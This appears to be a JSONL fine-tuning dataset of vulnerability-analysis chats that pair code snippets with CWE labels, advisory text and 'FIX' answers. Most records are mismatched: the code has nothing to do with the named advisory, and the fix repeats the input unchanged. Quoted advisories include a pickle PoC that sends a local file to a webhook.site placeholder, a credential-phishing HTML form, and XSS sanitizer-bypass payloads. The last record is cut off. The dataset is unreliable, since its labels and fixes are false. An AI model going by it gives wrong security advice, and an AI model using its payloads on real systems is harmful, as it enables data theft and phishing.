{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for ImageMagick: Malicious PCD files trigger 1\u2011byte heap Out-of-bounds Read and DoS :\n\nstatic int archinfo(RAnal *anal, int q) {\n\treturn 2; /* :) */\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-125\nREASON: The PCD coder\u2019s DecodeImage loop allows a crafted PCD file to trigger a 1\u2011byte heap out-of-bounds read when decoding an image (Denial of service) and potential disclosure of adjacent heap byte.\nFIX:\nstatic int archinfo(RAnal *anal, int q) {\n\treturn 2; /* :) */\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Jenkins has a build information disclosure vulnerability through Run Parameter :\n\nstatic int rfcomm_tty_chars_in_buffer(struct tty_struct *tty)\n{\n\tstruct rfcomm_dev *dev = (struct rfcomm_dev *) tty->driver_data;\n\n\tBT_DBG(\"tty %p dev %p\", tty, dev);\n\n\tif (!dev || !dev->dlc)\n\t\treturn 0;\n\n\tif (!skb_queue_empty(&dev->dlc->tx_queue))\n\t\treturn dev->dlc->mtu;\n\n\treturn 0;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-200\nREASON: Jenkins 2.550 and earlier, LTS 2.541.1 and earlier accepts Run Parameter values that refer to builds the user submitting the build does not have access to, allowing attackers with Item/Build and Item/Configure permission to obtain information about the existence of jobs, the existence of builds, and if a specified build exists, its display name.\nFIX:\nstatic int rfcomm_tty_chars_in_buffer(struct tty_struct *tty)\n{\n\tstruct rfcomm_dev *dev = (struct rfcomm_dev *) tty->driver_data;\n\n\tBT_DBG(\"tty %p dev %p\", tty, dev);\n\n\tif (!dev || !dev->dlc)\n\t\treturn 0;\n\n\tif (!skb_queue_empty(&dev->dlc->tx_queue))\n\t\treturn dev->dlc->mtu;\n\n\treturn 0;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Libredesk has Improper Neutralization of  HTML Tags in a Web Page:\n\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: ### Summary\n\nLibreDesk is vulnerable to **stored HTML injection** in the contact notes feature. When adding notes via `POST /api/v1/contacts/{id}/notes`, the backend automatically wraps user input in `<p>` tags. However, by intercepting the request and removing the `<p>` tag, an attacker can inject arbitrary HTML elements such as forms and images, which are then stored and rendered without proper sanitization. This can lead to phishing, CSRF-style forced actions, and UI redress attacks.\n\n---\n\n### Details\n\nWhen notes are added through the LibreDesk web application, the client sends note content wrapped inside `<p>` tags. The backend appears to **trust this HTML structure** and stores the content as-is.\n\nBy intercepting the request to:\n\n```\nPOST /api/v1/contacts/3/notes\n```\n\nand **removing the `<p>` wrapper**, an attacker can submit arbitrary HTML content. The backend does not sanitize or validate the HTML payload before persisting it.\n\nAs a result:\n\n* Arbitrary HTML tags (e.g., `<form>`, `<input>`, `<img>`) are stored\n* The injected HTML is rendered when the notes are viewed in the application\n* No server-side HTML sanitization or allowlisting is enforced\n\nThis indicates that the application relies on **client-side HTML formatting assumptions**, which can be bypassed by modifying the request.\n\n---\n\n### PoC\n\n1. Log in to LibreDesk and open any contact.\n2. Add a note normally via the UI.\n3. Intercept the request to:\n\n   ```\n   POST /api/v1/contacts/3/notes\n   ```\n4. Original request body (example):\n\n   ```json\n   {\n     \"note\": \"<p>This is a normal note</p>\"\n   }\n   ```\n5. Modify the payload by removing the `<p>` tag and injecting arbitrary HTML:\n\n   ```json\n   {\n     \"note\": \"<form action='https://webhook.site/xxxx' method='POST'>\n                <input type='text' name='username' placeholder='Username'>\n                <input type='password' name='password' placeholder='Password'>\n                <input type='submit' value='Re-authenticate'>\n              </form>\"\n   }\n   ```\n\n6. Forward the request.\n7. View the contact note in the LibreDesk UI.\n\n**Result:**\nThe injected HTML form is rendered inside the application.\n\n\n---\n\n### Impact\n\nThis is a **stored HTML injection** vulnerability affecting any user who can add or view contact notes.\n\nPotential impact includes:\n\n* Credential phishing through injected forms\n* CSRF-style forced actions using HTML-only forms\n* UI redress and social engineering\n* Increased risk if notes are viewed by privileged users (e.g., admins or agents)\n\nIf the notes are shared across users or roles, this vulnerability can be abused to target multiple users, increasing severity.\nFIX:\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Parcel has an Origin Validation Error vulnerability:\n\n_handle_captcha(xmpp_stanza_t *const stanza)\n{\n    xmpp_ctx_t *ctx = connection_get_ctx();\n    const char *from = xmpp_stanza_get_from(stanza);\n\n    if (!from) {\n        log_warning(\"Message received with no from attribute, ignoring\");\n        return;\n    }\n\n    char *message = xmpp_message_get_body(stanza);\n    if (!message) {\n        return;\n    }\n\n    sv_ev_room_broadcast(from, message);\n    xmpp_free(ctx, message);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-346\nREASON: parcel versions 1.6.1 and above have an Origin Validation Error vulnerability. Malicious websites can send XMLHTTPRequests to the application's development server and read the response to steal source code when developers visit them.\nFIX:\n_handle_captcha(xmpp_stanza_t *const stanza)\n{\n    xmpp_ctx_t *ctx = connection_get_ctx();\n    const char *from = xmpp_stanza_get_from(stanza);\n\n    if (!from) {\n        log_warning(\"Message received with no from attribute, ignoring\");\n        return;\n    }\n\n    char *message = xmpp_message_get_body(stanza);\n    if (!message) {\n        return;\n    }\n\n    sv_ev_room_broadcast(from, message);\n    xmpp_free(ctx, message);\n}\n"}]}
{"messages": [{"role": "user", "content": "analyze this code for security violations:\n\n/* TEMPLATE GENERATED TESTCASE FILE\nFilename: CWE416_Use_After_Free__return_freed_ptr_08.c\nLabel Definition File: CWE416_Use_After_Free__return_freed_ptr.label.xml\nTemplate File: point-flaw-08.tmpl.c\n*/\n/*\n * @description\n * CWE: 416 Use After Free\n * Sinks:\n *    GoodSink: Use a block of memory returned from a function\n *    BadSink : Use a block of memory returned from a function after it has been freed\n * Flow Variant: 08 Control flow: if(staticReturnsTrue()) and if(staticReturnsFalse())\n *\n * */\n\n#include \"std_testcase.h\"\n\nstatic char * helperBad(char * aString)\n{\n    size_t i = 0;\n    size_t j;\n    char * reversedString = NULL;\n    if (aString != NULL)\n    {\n        i = strlen(aString);\n        reversedString = (char *) malloc(i+1);\n        if (reversedString == NULL) {exit(-1);}\n        for (j = 0; j < i; j++)\n        {\n            reversedString[j] = aString[i-j-1];\n        }\n        reversedString[i] = '\\0';\n        /* FLAW: Freeing a memory block and then returning a pointer to the freed memory */\n        free(reversedString);\n        return reversedString;\n    }\n    else\n    {\n        return NULL;\n    }\n}\n\nstatic char * helperGood(char * aString)\n{\n    size_t i = 0;\n    size_t j;\n    char * reversedString = NULL;\n    if (aString != NULL)\n    {\n        i = strlen(aString);\n        reversedString = (char *) malloc(i+1);\n        if (reversedString == NULL) {exit(-1);}\n        for (j = 0; j < i; j++)\n        {\n            reversedString[j] = aString[i-j-1];\n        }\n        reversedString[i] = '\\0';\n        /* FIX: Do not free the memory before returning */\n        return reversedString;\n    }\n    else\n    {\n        return NULL;\n    }\n}\n\n/* The two function below always return the same value, so a tool\n   should be able to identify that calls to the functions will always\n   return a fixed value. */\nstatic int staticReturnsTrue()\n{\n    return 1;\n}\n\nstatic int staticReturnsFalse()\n{\n    return 0;\n}\n\n#ifndef OMITBAD\n\nvoid CWE416_Use_After_Free__return_freed_ptr_08_bad()\n{\n    if(staticReturnsTrue())\n    {\n        {\n            /* Call the bad helper function */\n            char * reversedString = helperBad(\"BadSink\");\n            printLine(reversedString);\n            /* free(reversedString);\n             * This call to free() was removed because we want the tool to detect the use after free,\n             * but we don't want that function to be free(). Essentially we want to avoid a double free\n             */\n        }\n    }\n}\n\n#endif /* OMITBAD */\n\n#ifndef OMITGOOD\n\n/* good1() uses if(staticReturnsFalse()) instead of if(staticReturnsTrue()) */\nstatic void good1()\n{\n    if(staticReturnsFalse())\n    {\n        /* INCIDENTAL: CWE 561 Dead Code, the code below will never run */\n        printLine(\"Benign, fixed string\");\n    }\n    else\n    {\n        {\n            /* Call the good helper function */\n            char * reversedString = helperGood(\"GoodSink\");\n            printLine(reversedString);\n            /* free(reversedString);\n             * This call to free() was removed because we want the tool to detect the use after free,\n             * but we don't want that function to be free(). Essentially we want to avoid a double free\n             */\n        }\n    }\n}\n\n/* good2() reverses the bodies in the if statement */\nstatic void good2()\n{\n    if(staticReturnsTrue())\n    {\n        {\n            /* Call the good helper function */\n            char * reversedString = helperGood(\"GoodSink\");\n            printLine(reversedString);\n            /* free(reversedString);\n             * This call to free() was removed because we want the tool to detect the use after free,\n             * but we don't want that function to be free(). Essentially we want to avoid a double free\n             */\n        }\n    }\n}\n\nvoid CWE416_Use_After_Free__return_freed_ptr_08_good()\n{\n    good1();\n    good2();\n}\n\n#endif /* OMITGOOD */\n\n/* Below is the main(). It is only used when building this testcase on\n   its own for testing or for building a binary to use in testing binary\n   analysis tools. It is not used when compiling all the testcases as one\n   application, which is how source code analysis tools are tested. */\n\n#ifdef INCLUDEMAIN\n\nint main(int argc, char * argv[])\n{\n    /* seed randomness */\n    srand( (unsigned)time(NULL) );\n#ifndef OMITGOOD\n    printLine(\"Calling good()...\");\n    CWE416_Use_After_Free__return_freed_ptr_08_good();\n    printLine(\"Finished good()\");\n#endif /* OMITGOOD */\n#ifndef OMITBAD\n    printLine(\"Calling bad()...\");\n    CWE416_Use_After_Free__return_freed_ptr_08_bad();\n    printLine(\"Finished bad()\");\n#endif /* OMITBAD */\n    return 0;\n}\n\n#endif\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"use_after_free\",\n  \"severity\": \"critical\",\n  \"explanation\": \"This code uses memory after it has been freed. This can lead to crashes, data corruption, or arbitrary code execution if an attacker can control the freed memory.\",\n  \"risk\": \"Memory corruption, arbitrary code execution, denial of service, privilege escalation\",\n  \"compliant_patch\": \"\\n// FIXED: Nullify pointers after free and check before use\\n// Instead of: free(ptr); ... use(ptr);\\n// Use: free(ptr); ptr = NULL; ... if (ptr) use(ptr);\\n\\n// Better: restructure code to avoid dangling pointers\\n// Use smart pointers or automatic memory management\\n\",\n  \"source\": \"SARD-240390\",\n  \"cwe\": \"CWE-416\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for HtmlSanitizer has a bypass via template tag:\n\nSAPI_API SAPI_POST_READER_FUNC(sapi_read_standard_form_data)\n{\n\tint read_bytes;\n\tint allocated_bytes=SAPI_POST_BLOCK_SIZE+1;\n\n\tif ((SG(post_max_size) > 0) && (SG(request_info).content_length > SG(post_max_size))) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"POST Content-Length of %ld bytes exceeds the limit of %ld bytes\",\n\t\t\t\t\tSG(request_info).content_length, SG(post_max_size));\n\t\treturn;\n\t}\n\tSG(request_info).post_data = emalloc(allocated_bytes);\n\n\tfor (;;) {\n\t\tread_bytes = sapi_module.read_post(SG(request_info).post_data+SG(read_post_bytes), SAPI_POST_BLOCK_SIZE TSRMLS_CC);\n\t\tif (read_bytes<=0) {\n\t\t\tbreak;\n\t\t}\n\t\tSG(read_post_bytes) += read_bytes;\n\t\tif ((SG(post_max_size) > 0) && (SG(read_post_bytes) > SG(post_max_size))) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Actual POST length does not match Content-Length, and exceeds %ld bytes\", SG(post_max_size));\n\t\t\tbreak;\n\t\t}\n\t\tif (read_bytes < SAPI_POST_BLOCK_SIZE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE >= allocated_bytes) {\n\t\t\tallocated_bytes = SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE+1;\n\t\t\tSG(request_info).post_data = erealloc(SG(request_info).post_data, allocated_bytes);\n\t\t}\n\t}\n\tSG(request_info).post_data[SG(read_post_bytes)] = 0;  /* terminating NULL */\n\tSG(request_info).post_data_length = SG(read_post_bytes);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: ### Impact\n\nIf the `template` tag is allowed, its contents are not sanitized. The `template` tag is a special tag that does not usually render its contents, unless the `shadowrootmode` attribute is set to `open` or `closed`. \n\nThe lack of sanitization of the template tag brings up two bypasses:\n\n1. it is still possible to forcibly render the contents of a `<template>` tag through mutation XSS. The DOM parsers in browsers such as Chromium have a node depth limit of 512 and tags which are beyond that depth are flattened. This in turn allows elements within `<template>` (which are not sanitized) to be effectively 'popped out'. An example would look like this: `<div>[...]<template><script>alert('xss')</script>` where `[...]` denotes at least another 509 opening `<div>` tags.\n2. If in addition to the template tag, the `shadowrootmode` attribute is allowed through `sanitizer.AllowedAttributes.Add(\"shadowrootmode\");`, the simple payload of `<div><template shadowrootmode=\"open\"><script>alert('xss')</script>` would bypass the sanitizer. This is because such usage of `<template>` attaches a shadow root to its parent: `<div>`, and its contents will be rendered. \n\nNote that the default configuration is not affected because the `template` tag is disallowed by default.\n\n### Patches\n\nThe problem has been patched in versions [9.0.892](https://www.nuget.org/packages/HtmlSanitizer/9.0.892) and [9.1.893-beta](https://www.nuget.org/packages/HtmlSanitizer/9.1.893-beta).\n\n### Workarounds\n\nDisallow the `template` tag. It is disallowed by default.\n\n### Resources\n\nhttps://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/template\nFIX:\nSAPI_API SAPI_POST_READER_FUNC(sapi_read_standard_form_data)\n{\n\tint read_bytes;\n\tint allocated_bytes=SAPI_POST_BLOCK_SIZE+1;\n\n\tif ((SG(post_max_size) > 0) && (SG(request_info).content_length > SG(post_max_size))) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"POST Content-Length of %ld bytes exceeds the limit of %ld bytes\",\n\t\t\t\t\tSG(request_info).content_length, SG(post_max_size));\n\t\treturn;\n\t}\n\tSG(request_info).post_data = emalloc(allocated_bytes);\n\n\tfor (;;) {\n\t\tread_bytes = sapi_module.read_post(SG(request_info).post_data+SG(read_post_bytes), SAPI_POST_BLOCK_SIZE TSRMLS_CC);\n\t\tif (read_bytes<=0) {\n\t\t\tbreak;\n\t\t}\n\t\tSG(read_post_bytes) += read_bytes;\n\t\tif ((SG(post_max_size) > 0) && (SG(read_post_bytes) > SG(post_max_size))) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Actual POST length does not match Content-Length, and exceeds %ld bytes\", SG(post_max_size));\n\t\t\tbreak;\n\t\t}\n\t\tif (read_bytes < SAPI_POST_BLOCK_SIZE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE >= allocated_bytes) {\n\t\t\tallocated_bytes = SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE+1;\n\t\t\tSG(request_info).post_data = erealloc(SG(request_info).post_data, allocated_bytes);\n\t\t}\n\t}\n\tSG(request_info).post_data[SG(read_post_bytes)] = 0;  /* terminating NULL */\n\tSG(request_info).post_data_length = SG(read_post_bytes);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Liferay Portal is vulnerable to XSS attacks via its remote app title field:\n\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: A stored cross-site scripting (XSS) vulnerability in Liferay Portal 7.4.0 through 7.4.3.128, and Liferay DXP 2024.Q3.0 through 2024.Q3.5, 2024.Q2.0 through 2024.Q2.12, 2024.Q1.1 through 2024.Q1.12, and 7.4 GA through update 92 allows remote attackers to inject arbitrary web script or HTML via remote app title field.\nFIX:\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for gobase subject to Incorrect routing of some HTTP requests when using httpauth due to a race condition:\n\nint platform_get_irq(struct platform_device *dev, unsigned int num)\n{\n#ifdef CONFIG_SPARC\n\t/* sparc does not have irqs represented as IORESOURCE_IRQ resources */\n\tif (!dev || num >= dev->archdata.num_irqs)\n\t\treturn -ENXIO;\n\treturn dev->archdata.irqs[num];\n#else\n\tstruct resource *r;\n\tif (IS_ENABLED(CONFIG_OF_IRQ) && dev->dev.of_node) {\n\t\tint ret;\n\n\t\tret = of_irq_get(dev->dev.of_node, num);\n\t\tif (ret > 0 || ret == -EPROBE_DEFER)\n\t\t\treturn ret;\n\t}\n\n\tr = platform_get_resource(dev, IORESOURCE_IRQ, num);\n\tif (has_acpi_companion(&dev->dev)) {\n\t\tif (r && r->flags & IORESOURCE_DISABLED) {\n\t\t\tint ret;\n\n\t\t\tret = acpi_irq_get(ACPI_HANDLE(&dev->dev), num, r);\n\t\t\tif (ret)\n\t\t\t\treturn ret;\n\t\t}\n\t}\n\n\t/*\n\t * The resources may pass trigger flags to the irqs that need\n\t * to be set up. It so happens that the trigger flags for\n\t * IORESOURCE_BITS correspond 1-to-1 to the IRQF_TRIGGER*\n\t * settings.\n\t */\n\tif (r && r->flags & IORESOURCE_BITS) {\n\t\tstruct irq_data *irqd;\n\n\t\tirqd = irq_get_irq_data(r->start);\n\t\tif (!irqd)\n\t\t\treturn -ENXIO;\n\t\tirqd_set_trigger_type(irqd, r->flags & IORESOURCE_BITS);\n\t}\n\n\treturn r ? r->start : -ENXIO;\n#endif\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-362\nREASON: ### Impact\nIncorrect routing of some HTTP requests when using httpauth due to a race condition\n\n### Patches\nUpgrade to version 0.7.2 for fix\n\n### Workarounds\nNone\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [nbosscher@blue-giraffe.ca](mailto:nbosscher@blue-giraffe.ca)\nFIX:\nint platform_get_irq(struct platform_device *dev, unsigned int num)\n{\n#ifdef CONFIG_SPARC\n\t/* sparc does not have irqs represented as IORESOURCE_IRQ resources */\n\tif (!dev || num >= dev->archdata.num_irqs)\n\t\treturn -ENXIO;\n\treturn dev->archdata.irqs[num];\n#else\n\tstruct resource *r;\n\tif (IS_ENABLED(CONFIG_OF_IRQ) && dev->dev.of_node) {\n\t\tint ret;\n\n\t\tret = of_irq_get(dev->dev.of_node, num);\n\t\tif (ret > 0 || ret == -EPROBE_DEFER)\n\t\t\treturn ret;\n\t}\n\n\tr = platform_get_resource(dev, IORESOURCE_IRQ, num);\n\tif (has_acpi_companion(&dev->dev)) {\n\t\tif (r && r->flags & IORESOURCE_DISABLED) {\n\t\t\tint ret;\n\n\t\t\tret = acpi_irq_get(ACPI_HANDLE(&dev->dev), num, r);\n\t\t\tif (ret)\n\t\t\t\treturn ret;\n\t\t}\n\t}\n\n\t/*\n\t * The resources may pass trigger flags to the irqs that need\n\t * to be set up. It so happens that the trigger flags for\n\t * IORESOURCE_BITS correspond 1-to-1 to the IRQF_TRIGGER*\n\t * settings.\n\t */\n\tif (r && r->flags & IORESOURCE_BITS) {\n\t\tstruct irq_data *irqd;\n\n\t\tirqd = irq_get_irq_data(r->start);\n\t\tif (!irqd)\n\t\t\treturn -ENXIO;\n\t\tirqd_set_trigger_type(irqd, r->flags & IORESOURCE_BITS);\n\t}\n\n\treturn r ? r->start : -ENXIO;\n#endif\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for picklescan has Arbitrary file read using `io.FileIO` :\n\ninit_time (void)\n{\n  gettime (&initial_time);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: ### Summary\nUnsafe pickle deserialization allows unauthenticated attackers to read arbitrary server files and perform SSRF. By chaining io.FileIO and urllib.request.urlopen, an attacker can bypass RCE-focused blocklists to exfiltrate sensitive data (example: /etc/passwd) to an external server.\n\n### Details\nThe application deserializes untrusted pickle data. While RCE keywords (os, exec) may be blocked, the exploit abuses standard library features:\n\n1. io.FileIO: Opens local files without using builtins.open.\n\n2. urllib.request.urlopen: Accepts the file object as an iterable body for a POST request.\n\n3. Data Exfiltration: The file content is streamed directly to an attacker-controlled URL during unpickling.\n\n### PoC\n\n```python\nimport pickle, io, urllib.request\n\nclass GetFile:\n    def __reduce__(self):\n        return (io.FileIO, ('/etc/hosts', 'r'))\n\nclass Exfiltrate:\n    def __reduce__(self):\n        return (urllib.request.urlopen, ('https://webhook.site/YOUR_UUID_HERE', GetFile()))\n\nwith open(\"bypass_http.pkl\", \"wb\") as f:\n    pickle.dump(Exfiltrate(), f)\n```\n\n<img width=\"650\" height=\"114\" alt=\"Screenshot 2025-12-30 at 10 13 14\u202fPM\" src=\"https://github.com/user-attachments/assets/4edf9640-80f6-4701-ae87-cff1079e2994\" />\n\n\n### Impact\n\n- Arbitrary file read\n\nThanks for this library and your time. If you think `picklescan` is focused on detecting only `RCE` kind of vulnerabilities rather adding `File IO`, `Http` or any protocol based may cause lot of noise, feel free to close this issue.\nFIX:\ninit_time (void)\n{\n  gettime (&initial_time);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Vitess users with backup storage access can gain unauthorized access to production deployment environments:\n\nstruct vdagent_file_xfers *vdagent_file_xfers_create(\n    struct udscs_connection *vdagentd, const char *save_dir,\n    int open_save_dir, int debug)\n{\n    struct vdagent_file_xfers *xfers;\n\n    xfers = g_malloc(sizeof(*xfers));\n    xfers->xfers = g_hash_table_new_full(g_direct_hash, g_direct_equal,\n                                         NULL, vdagent_file_xfer_task_free);\n    xfers->vdagentd = vdagentd;\n    xfers->save_dir = g_strdup(save_dir);\n    xfers->open_save_dir = open_save_dir;\n    xfers->debug = debug;\n\n    return xfers;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-78\nREASON: ### Impact\n\nAny user with read/write access to the backup storage location (e.g. an S3 bucket) can manipulate backup manifest files so that arbitrary code is later executed when that backup is restored. This can be used to provide that attacker with unintended/unauthorized access to the production deployment environment \u2014 allowing them to access information available in that environment as well as run any additional arbitrary commands there.\n\n### Patches\nFixes are expected to be released with versions v23.0.3 and v22.0.4\nSee fix commit at https://github.com/vitessio/vitess/commit/4c0173293907af9cb942a6683c465c3f1e9fdb5c\n\n### Workarounds\n\nIf maintainers *intended* to use an external decompressor then they can always specify that decompressor command in the `--external-decompressor` flag value for `vttablet` and `vtbackup`. That then overrides any value specified in the manifest file.\n\nIf maintainers did *not intend* to use an external decompressor, nor an internal one, then they can specify a value such as `cat` or `tee` in the `--external-decompressor` flag value for `vttablet` and `vtbackup` to ensure that a harmless command is always used. \n\n### References\n\nUsers can read more about the issue here: https://github.com/vitessio/vitess/issues/19459\nFIX:\nstruct vdagent_file_xfers *vdagent_file_xfers_create(\n    struct udscs_connection *vdagentd, const char *save_dir,\n    int open_save_dir, int debug)\n{\n    struct vdagent_file_xfers *xfers;\n\n    xfers = g_malloc(sizeof(*xfers));\n    xfers->xfers = g_hash_table_new_full(g_direct_hash, g_direct_equal,\n                                         NULL, vdagent_file_xfer_task_free);\n    xfers->vdagentd = vdagentd;\n    xfers->save_dir = g_strdup(save_dir);\n    xfers->open_save_dir = open_save_dir;\n    xfers->debug = debug;\n\n    return xfers;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Code Injection in microweber:\n\nstatic void gen_eob(DisasContext *s)\n{\n    gen_eob_worker(s, false, false);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-94\nREASON: Cross-site Scripting in Packagist microweber/microweber prior to 1.2.11.\nFIX:\nstatic void gen_eob(DisasContext *s)\n{\n    gen_eob_worker(s, false, false);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Docker Compose Vulnerable to Path Traversal via OCI Artifact Layer Annotations:\n\ninit_time (void)\n{\n  gettime (&initial_time);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: Docker Compose trusts the path information embedded in remote OCI compose artifacts. When a layer includes the annotations com.docker.compose.extends or com.docker.compose.envfile, Compose joins the attacker\u2011supplied value from com.docker.compose.file/com.docker.compose.envfile with its local cache directory and writes the file there. \n\n### Impact\nThis affects any platform or workflow that resolves remote OCI compose artifacts, Docker Desktop, standalone Compose binaries on Linux, CI/CD runners, cloud dev environments is affected.\nAn attacker can escape the cache directory and overwrite arbitrary files on the machine running docker compose, even if the user only runs read\u2011only commands such as docker compose config or docker compose ps.\n\n### Patches\nv2.40.2\n\n### Workarounds\nNA\nFIX:\ninit_time (void)\n{\n  gettime (&initial_time);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for devalue affected by CPU and memory amplification from sparse arrays:\n\nserver_response(struct httpd *httpd, struct client *clt)\n{\n\tchar\t\t\t path[PATH_MAX];\n\tchar\t\t\t hostname[HOST_NAME_MAX+1];\n\tstruct http_descriptor\t*desc = clt->clt_descreq;\n\tstruct http_descriptor\t*resp = clt->clt_descresp;\n\tstruct server\t\t*srv = clt->clt_srv;\n\tstruct server_config\t*srv_conf = &srv->srv_conf;\n\tstruct kv\t\t*kv, key, *host;\n\tstruct str_find\t\t sm;\n\tint\t\t\t portval = -1, ret;\n\tchar\t\t\t*hostval;\n\tconst char\t\t*errstr = NULL;\n\n\t/* Canonicalize the request path */\n\tif (desc->http_path == NULL ||\n\t    url_decode(desc->http_path) == NULL ||\n\t    canonicalize_path(desc->http_path, path, sizeof(path)) == NULL)\n\t\tgoto fail;\n\tfree(desc->http_path);\n\tif ((desc->http_path = strdup(path)) == NULL)\n\t\tgoto fail;\n\n\tkey.kv_key = \"Host\";\n\tif ((host = kv_find(&desc->http_headers, &key)) != NULL &&\n\t    host->kv_value == NULL)\n\t\thost = NULL;\n\n\tif (strcmp(desc->http_version, \"HTTP/1.1\") == 0) {\n\t\t/* Host header is mandatory */\n\t\tif (host == NULL)\n\t\t\tgoto fail;\n\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"close\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist = 0;\n\t\telse\n\t\t\tclt->clt_persist++;\n\t} else {\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"keep-alive\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist++;\n\t\telse\n\t\t\tclt->clt_persist = 0;\n\t}\n\n\tif (clt->clt_persist >= srv_conf->maxrequests)\n\t\tclt->clt_persist = 0;\n\n\t/*\n\t * Do we have a Host header and matching configuration?\n\t * XXX the Host can also appear in the URL path.\n\t */\n\tif (host != NULL) {\n\t\tif ((hostval = server_http_parsehost(host->kv_value,\n\t\t    hostname, sizeof(hostname), &portval)) == NULL)\n\t\t\tgoto fail;\n\n\t\tTAILQ_FOREACH(srv_conf, &srv->srv_hosts, entry) {\n#ifdef DEBUG\n\t\t\tif ((srv_conf->flags & SRVFLAG_LOCATION) == 0) {\n\t\t\t\tDPRINTF(\"%s: virtual host \\\"%s:%u\\\"\"\n\t\t\t\t    \" host \\\"%s\\\" (\\\"%s\\\")\",\n\t\t\t\t    __func__, srv_conf->name,\n\t\t\t\t    ntohs(srv_conf->port), host->kv_value,\n\t\t\t\t    hostname);\n\t\t\t}\n#endif\n\t\t\tif (srv_conf->flags & SRVFLAG_LOCATION)\n\t\t\t\tcontinue;\n\t\t\telse if (srv_conf->flags & SRVFLAG_SERVER_MATCH) {\n\t\t\t\tstr_find(hostname, srv_conf->name,\n\t\t\t\t    &sm, 1, &errstr);\n\t\t\t\tret = errstr == NULL ? 0 : -1;\n\t\t\t} else {\n\t\t\t\tret = fnmatch(srv_conf->name,\n\t\t\t\t    hostname, FNM_CASEFOLD);\n\t\t\t}\n\t\t\tif (ret == 0 &&\n\t\t\t    (portval == -1 ||\n\t\t\t    (portval != -1 && portval == srv_conf->port))) {\n\t\t\t\t/* Replace host configuration */\n\t\t\t\tclt->clt_srv_conf = srv_conf;\n\t\t\t\tsrv_conf = NULL;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (srv_conf != NULL) {\n\t\t/* Use the actual server IP address */\n\t\tif (server_http_host(&clt->clt_srv_ss, hostname,\n\t\t    sizeof(hostname)) == NULL)\n\t\t\tgoto fail;\n\t} else {\n\t\t/* Host header was valid and found */\n\t\tif (strlcpy(hostname, host->kv_value, sizeof(hostname)) >=\n\t\t    sizeof(hostname))\n\t\t\tgoto fail;\n\t\tsrv_conf = clt->clt_srv_conf;\n\t}\n\n\tif ((desc->http_host = strdup(hostname)) == NULL)\n\t\tgoto fail;\n\n\t/* Now fill in the mandatory parts of the response descriptor */\n\tresp->http_method = desc->http_method;\n\tif ((resp->http_version = strdup(desc->http_version)) == NULL)\n\t\tgoto fail;\n\n\t/* Now search for the location 